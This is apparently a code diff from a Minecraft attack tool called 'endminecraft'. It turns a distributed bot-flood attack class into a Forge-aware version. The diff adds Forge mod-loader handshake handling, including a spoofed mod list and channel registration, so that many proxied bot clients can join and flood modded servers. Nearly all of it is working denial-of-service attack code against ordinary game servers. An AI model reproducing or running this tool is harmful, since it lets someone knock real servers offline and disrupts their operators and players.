@@ -1,11 +1,16 @@
-package me.alikomi.endminecraft.tasks.attack;
+package me.alikomi.endminecraft.tasks.attack.forge;
 
+import io.netty.buffer.ByteBuf;
+import io.netty.buffer.Unpooled;
+import me.alikomi.endminecraft.utils.DefinedPacket;
 import me.alikomi.endminecraft.utils.MinecraftPackets;
 import me.alikomi.endminecraft.utils.Util;
 import org.spacehq.mc.protocol.MinecraftProtocol;
 import org.spacehq.mc.protocol.packet.ingame.client.ClientChatPacket;
+import org.spacehq.mc.protocol.packet.ingame.client.ClientPluginMessagePacket;
 import org.spacehq.mc.protocol.packet.ingame.client.ClientTabCompletePacket;
 import org.spacehq.mc.protocol.packet.ingame.server.ServerJoinGamePacket;
+import org.spacehq.mc.protocol.packet.ingame.server.ServerPluginMessagePacket;
 import org.spacehq.packetlib.Client;
 import org.spacehq.packetlib.event.session.*;
 import org.spacehq.packetlib.tcp.TcpSessionFactory;
@@ -18,7 +23,7 @@ import java.util.*;
 import java.util.concurrent.locks.Lock;
 import java.util.concurrent.locks.ReentrantLock;
 
-public class DistributedBotAttack extends Util {
+public class DistributedForgeBotAttack extends Util {
 
     private static String ip;
     private static int port;
@@ -32,9 +37,11 @@ public class DistributedBotAttack extends Util {
     private static List<String> ipsKey;
     private boolean tab;
     private boolean lele;
+    private Map<String,String> modlist;
+    private static byte[] reg;
 
 
-    public DistributedBotAttack(String ip, int port, long time, int sleepTime, Map<String, Proxy.Type> ips, boolean tab, boolean lele) {
+    public DistributedForgeBotAttack(String ip, int port, long time, int sleepTime, Map<String, Proxy.Type> ips, boolean tab, boolean lele,Map<String,String> modlist) {
         this.ip = ip;
         this.port = port;
         this.time = time;
@@ -43,6 +50,7 @@ public class DistributedBotAttack extends Util {
         this.ipsKey = Arrays.asList(ips.keySet().toArray(new String[ips.size()]));
         this.tab = tab;
         this.lele = lele;
+        this.modlist = modlist;
     }
 
     public boolean startAttack() {
@@ -105,12 +113,42 @@ public class DistributedBotAttack extends Util {
         return sb.toString();
     }
 
+    boolean yy = false;
+
     private Client start(Proxy.Type tp, String po) {
         MinecraftProtocol mc = new MinecraftProtocol(getRandomString(new Random().nextInt(9) % (9 - 4 + 1) + 4));
         Proxy proxy = new Proxy(tp, new InetSocketAddress(po.split(":")[0], Integer.parseInt(po.split(":")[1])));
         final Client client = new Client(ip, port, mc, new TcpSessionFactory(proxy));
         client.getSession().addListener(new SessionListener() {
             public void packetReceived(PacketReceivedEvent packetReceivedEvent) {
+                if (packetReceivedEvent.getPacket() instanceof ServerPluginMessagePacket) {
+                    byte[] data = ((ServerPluginMessagePacket) packetReceivedEvent.getPacket()).getData();
+                    //SendHello
+                    if (((ServerPluginMessagePacket) packetReceivedEvent.getPacket()).getChannel().equals("FML|HS") && data.length > 2 && ((byte) 0) == data[0]) {
+                        client.getSession().send(new ClientPluginMessagePacket("REGISTER", reg));
+                        client.getSession().send(new ClientPluginMessagePacket("FML|HS", new byte[]{0x01, 0x02}));
+                        ByteBuf bf = Unpooled.buffer();
+                        DefinedPacket.writeVarInt(2, bf);
+                        bf.writeByte(modlist.size());
+                        modlist.forEach((k, v) -> {
+                            DefinedPacket.writeString(k, bf);
+                            DefinedPacket.writeString(v, bf);
+                        });
+
+                        client.getSession().send(new ClientPluginMessagePacket("FML|HS", fb(bf.array())));
+                    }
+                    //SendACK
+                    if (((ServerPluginMessagePacket) packetReceivedEvent.getPacket()).getChannel().equals("FML|HS") && data.length > 1 && ((byte) 2) == data[0]) {
+                        client.getSession().send(new ClientPluginMessagePacket("FML|HS", new byte[]{(byte) -1, 0x02}));
+                    }
+                    //Read RegistryData
+                    if (((ServerPluginMessagePacket) packetReceivedEvent.getPacket()).getChannel().equals("FORGE") && data.length > 1 && ((byte) 2) == data[0]) {
+                        client.getSession().send(new ClientPluginMessagePacket("FML|HS", new byte[]{(byte) -1, 0x03}));
+                    }
+                    if (((ServerPluginMessagePacket) packetReceivedEvent.getPacket()).getChannel().equals("REGISTER")) {
+                        reg = ((ServerPluginMessagePacket) packetReceivedEvent.getPacket()).getData();
+                    }
+                }
                 if (packetReceivedEvent.getPacket() instanceof ServerJoinGamePacket) {
 
                     new Thread(() -> {
@@ -152,7 +190,7 @@ public class DistributedBotAttack extends Util {
             public void disconnected(DisconnectedEvent disconnectedEvent) {
                 String msg = disconnectedEvent.getReason();
                 if (msg.contains("refused") || msg.contains("here") || !isAttack) return;
-                log("Bot " + mc.getProfile().getName() + " 断开连接： " + msg);
+                log("用户 " + mc.getProfile().getName() + "断开连接： " + msg);
             }
         });
         if (lele) new Thread(() -> getMotd(proxy)).start();
